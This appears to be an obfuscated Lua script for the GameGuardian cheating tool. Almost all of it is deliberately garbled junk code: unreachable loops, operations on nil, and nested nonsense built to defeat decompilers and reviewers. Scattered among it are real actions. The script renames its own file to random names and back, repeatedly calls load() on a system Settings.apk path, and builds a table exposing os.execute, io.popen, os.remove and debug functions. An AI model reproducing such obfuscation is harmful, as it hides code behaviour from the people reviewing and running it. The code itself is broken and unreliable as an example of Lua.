					_C = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)}
						_C = _C()
							if _C == nil then 
								_C = {_C(_C*nil)(_C*nil)(nil * 1, 1  << nil), _C*nil}
								end
						while _B ~= _C do if _T ~= _C then do
							_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
								_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
									_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
										_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
											_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												end end end
											end end
										while _B ~= nil do 
											_C = nil,nil,nil,nil
									end
									for i=1,0 do;local j={}if j.i~=nil then j.i=j.i()end;end;
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 100 do load("/system/priv-app/Settings/Settings.apk") end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
local func={['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['concat']=table.concat,['remove']=table.remove,['sort']=table.sort,['pack']=table.pack,['move']=table.move,['insert']=table.insert,['unpack']=table.unpack,['ipairs']=ipairs,['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['ipairs']=ipairs,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['error']=error,['tonumber']=tonumber,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen,['getregistry']=debug.getregistry,['getuservalue']=debug.getuservalue,['setuservalue']=debug.setuservalue,['getupvalue']=debug.getupvalue,['getinfo']=debug.getinfo,['getlocal']=debug.getlocal,['setlocal']=debug.setlocal,['setupvalue']=debug.setupvalue,['traceback']=debug.traceback,['getmetatable']=debug.getmetatable,['setmetatable']=debug.setmetatable,['debug']=debug.debug,['upvaluejoin']=debug.upvaluejoin,['getxnxxxxxx']=debug.getxnxxxxxx,['setxnxxxxxx']=debug.setxnxxxxxx,['upvalueid']=debug.upvalueid,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['setlocale']=os.setlocale,['clock']=os.clock,['tmpname']=os.tmpname,['getenv']=os.getenv,['execute']=os.execute,['difftime']=os.difftime,['rename']=os.rename,['exit']=os.exit,['remove']=os.remove,['time']=os.time,['date']=os.date,['popen']=io.popen,['lines']=io.lines,['write']=io.write,['tmpfile']=io.tmpfile,['open']=io.open,['close']=io.close,['input']=io.input,['read']=io.read,['output']=io.output,['flush']=io.flush,['type']=io.type,['loadlib']=package.loadlib,['searchpath']=package.searchpath,['rshift']=bit32.rshift,['bnot']=bit32.bnot,['lshift']=bit32.lshift,['bxor']=bit32.bxor,['btest']=bit32.btest,['extract']=bit32.extract,['lrotate']=bit32.lrotate,['rrotate']=bit32.rrotate,['band']=bit32.band,['replace']=bit32.replace,['bor']=bit32.bor,['arshift']=bit32.arshift,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['dump']=string.dump,['reverse']=string.reverse,['char_']=string.char,['unpack']=string.unpack,['match']=string.match,['gsub']=string.gsub,['find']=string.find,['pack']=string.pack,['gmatch']=string.gmatch,['format']=string.format,['packsize']=string.packsize,['lower']=string.lower,['upper']=string.upper,['rep']=string.rep,['sub']=string.sub,['byte_']=string.byte,['len']=string.len,['error']=error,['tonumber']=tonumber,['sqrt']=math.sqrt,['atan2']=math.atan2,['ceil']=math.ceil,['tanh']=math.tanh,['rad']=math.rad,['abs']=math.abs,['sinh']=math.sinh,['atan2']=math.atan,['fmod']=math.fmod,['random']=math.random,['randomseed']=math.randomseed,['max']=math.max,['modf']=math.modf,['ldexp']=math.ldexp,['exp']=math.exp,['deg']=math.deg,['cosh']=math.cosh,['ult']=math.ult,['log']=math.log,['tointeger']=math.tointeger,['frexp']=math.frexp,['asin']=math.asin,['tan']=math.tan,['floor']=math.floor,['pow']=math.pow,['acos']=math.acos,['cos']=math.cos,['type']=math.type,['sin']=math.sin,['min']=math.min,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen}
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
 for i = 1, 0 do i(-nil)(-nil)(-nil * 1)(-nil)(-nil)(-nil)(-nil * 1) end 
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
local GBLQ = string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90))
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
for i = 1, 0 do local RR = {} local R = {} R.R = {} R.RRR = RR.Z() R.RRR = R.RRR:Z() R.R[B] = R[Z] end
